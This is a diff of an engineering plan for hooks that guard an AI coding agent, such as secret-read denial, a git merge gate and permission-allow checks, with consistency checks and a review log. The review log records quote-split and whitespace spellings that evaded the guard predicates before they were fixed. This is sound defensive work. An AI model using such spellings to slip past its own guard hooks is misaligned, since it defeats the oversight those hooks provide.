   - A script with a syntax error → `BROKEN`.
-  - A rendered user path with spaces (`C:/Program Files/...` style under a temp dir with a space) is resolved.
+  - A rendered user path with spaces (a temp HOME whose name has a space) is resolved through the exec-form `args` read.
+  - A live settings file with an unrendered `@BASH@` is reported, and `--report` exits 1.
   - `run-gate.sh` in permissions is not reported.
 - [ ] **Step 2.** Implement the hook and its mirror (`cmp`), the registrations (templates: edit `general`, `cp` ×5, `md5sum` all six), check 70 and the drift-script section.
 - [ ] **Step 3: GREEN.** `RB C2b`. Full consistency run (check 70 PASS; the control row FAILs as designed inside the check). `RI bash scripts/verify-user-level-drift.sh` against a temp `DRIFT_LIVE_*` root rendered from the branch → 0 drift. Equivalence run (SessionStart rows: class `allow`/`context` unchanged when healthy).
@@ -380,7 +422,7 @@ The matchers are unchanged. UserPromptSubmit `date` is **unchanged** (check 62).
 ### Task 10: Project registrations in the new forms, C5 step-aside, check 71 (C1 project, C5)
 
 **Files:**
-- Modify: `templates/general/.claude/settings.json`, then `cp` to the other five; root `.claude/settings.json`; `templates/general/.claude/agents/coder.md` (frontmatter `gate-before-merge` → F), then the variant copies of `coder.md`
+- Modify: `templates/general/.claude/settings.json`, then `cp` to the other five; root `.claude/settings.json`; the frontmatter `gate-before-merge` → F in **every** agent that carries it: `coder.md` (edit `templates/general`, `cp` to the variants that have it), `dotnet-coder.md` (dotnet, dotnet-maui), `java-coder.md`, `python-coder.md`, `rust-coder.md`. The census is `grep -l 'hooks/gate-before-merge.sh' templates/*/.claude/agents/*.md`: every file it lists is edited, and each one is a row in check 71's frozen table.
 - Modify: `user-level-reference/settings.json` (add `<SA_X>` to the five user entries, if Task 8 left it out), `scripts/verify-template-consistency.sh` (update section 13's path extraction if needed, section 24's `ABS_FORM` census, section 21c-3e and check 64's adjacency; add check 71)
 - Test: new block `C5`
 
@@ -392,11 +434,13 @@ The matchers are unchanged. UserPromptSubmit `date` is **unchanged** (check 62).
 - Section 24: `ABS_FORM` becomes the set {F, W, O, U} prefixes (`f=\"${CLAUDE_PROJECT_DIR:-.}/hooks/` or `exec bash \"${CLAUDE_PROJECT_DIR:-.}/hooks/`). The count must still equal `hookcmd_total`. `NOFALLBACK_FORM` and the cwd-relative ban stay.
 - 21c-3e: `hooks/$gh\.sh.*HOOK SCRIPT MISSING.*exit 2` still matches F (same line), so it should need no change. Confirm it.
 - Section 13's `grep -o 'hooks/[A-Za-z0-9_-]*\.sh'` is form-agnostic. Confirm it.
+- **Section 6b's "collector control"** builds its list with `grep -o "(HOOK SCRIPT MISSING|WARN): [^ ]*hooks/X.sh"`. The new F/W messages print `$f`, not the path, so that list would be **empty**, and the check would pass on 0 of 0 (review finding 3). Re-aim it at the paths in the registration strings (`f=\"…/hooks/X.sh\"` and `exec bash \"…/hooks/X.sh\"`). Assert a minimum count: at least the number of F + W + O + U entries in `templates/general`, counted by check 71's table. Run its control and confirm it still goes red.
+- `grep -n 'HOOK SCRIPT MISSING\|c=\$?\|"127"' scripts/verify-template-consistency.sh` lists every other assertion that keys on the old wrapper text. Re-aim each one in the same way; none is deleted.
 
 **Check 71 (registration polarity, frozen set).**
 - (1) A literal table in the check, `event|matcher|script|form` for every registration in `templates/general`, root and `user-level-reference`, equals the extracted set. **A removed or added matcher group, or a changed form, is red** (R-5).
 - (2) Every F/UF hook carries the Task 2 trap line, and no registered hook other than those six has a `trap … EXIT`.
-- (3) No hook that can print `"permissionDecision": "allow"` (grep) is registered F/UF.
+- (3) No hook that can print an allow is registered F/UF. The grep is `permissionDecision"?[[:space:]]*:[[:space:]]*"allow"`, and it must find `read-size-gate.sh` (a positive control, so the grep provably matches the JS spelling).
 - (4) `enforce-agent-contract` is U.
 - (5) For each C5 hook, the template registers it under a matcher whose alternatives (split on `|`) are a superset of the user-level matcher's. Otherwise stepping aside would drop coverage for a tool.
 - (6) Hooks that are sourced (UF/UO/UU) have no top-level `return` (Task 2's awk).
@@ -450,6 +494,8 @@ The matchers are unchanged. UserPromptSubmit `date` is **unchanged** (check 62).
     - (b) On Windows, `exec` in the project form may not save the process slot (D1(a)), so read the Windows column.
     - (c) A hook whose path holds a `"` or a newline is not supported by the render script.
     - (d) `disableAllHooks` in a project's local settings is not inspected by the step-aside.
+    - (e) A `W` hook whose own last command is not found (or with no `bash` on PATH) now shows a non-blocking hook error instead of its WARN line. The decision is the same: the call proceeds.
+    - (f) `bash-output-guard` no longer prints its once-per-TMPDIR no-node WARN for outputs under the threshold.
 - [ ] **Step 2: Downstream migration (numbered):**
   1. Pull or sync the toolkit.
   2. `bash scripts/render-user-hooks.sh --print` and review it, then `--write`. A backup `~/.claude/settings.json.bak-<ts>` is written; restoring it backs the change out.
@@ -554,3 +600,24 @@ Command: `bash <scratchpad>/count.sh` (strace `-f -e trace=execve,fork,vfork,clo
 | gate-before-merge | 92 / 41 / 1 | 66 / 26 / 1 |
 
 For a plain project (user-level set: `no-push-main` + `deny-secret-reads` + `deny-hang-shapes` + `bash-output-guard`), one `git status` Bash call is about **155 processes, 11 of them node**, on Linux at this base.
+
+## Review log
+
+**Round 1** (opus, 2026-10-04): REJECT, on two Critical findings. Both are fixed in this revision.
+- **C1:** the `deny-secret-reads` predicate tested raw text. It now tests quote-stripped text, `.e` or a backslash.
+- **C2:** the git-gate predicate missed a `.` after a newline or TAB, and quote-split `g"i"t`. It now tests quote-stripped text and uses the `_np_dot` regex. Re-probed: the scratch `pred.sh` gives CONT for every reproduced miss and EXIT0 for `ls -la`, `npm test` and `echo "done. ok"`.
+
+Important findings, all fixed:
+- (3) Section 6b collector re-aimed, with a minimum count.
+- (4) `command -v bash` in F.
+- (5) `@…@` placeholder guards.
+- (6) `\"` anchor on the step-aside.
+- (7) All five coder agents named.
+- (8) `read-size-gate` allow fact, and the grep.
+- (9) Equivalence runtime: background runs, chunking, all three configs at Tasks 4/7/10/13, stub Test and Gate.
+- (10) Exec-form args read through the parser chain.
+
+Minor findings:
+- (11) `deny-hang-shapes` moved after its parse.
+- (12) and (13) recorded as Known limits (f) and (e); the harness classes non-blocking errors as `allow*`.
+- (14) Row 1 made precise; alias row added.
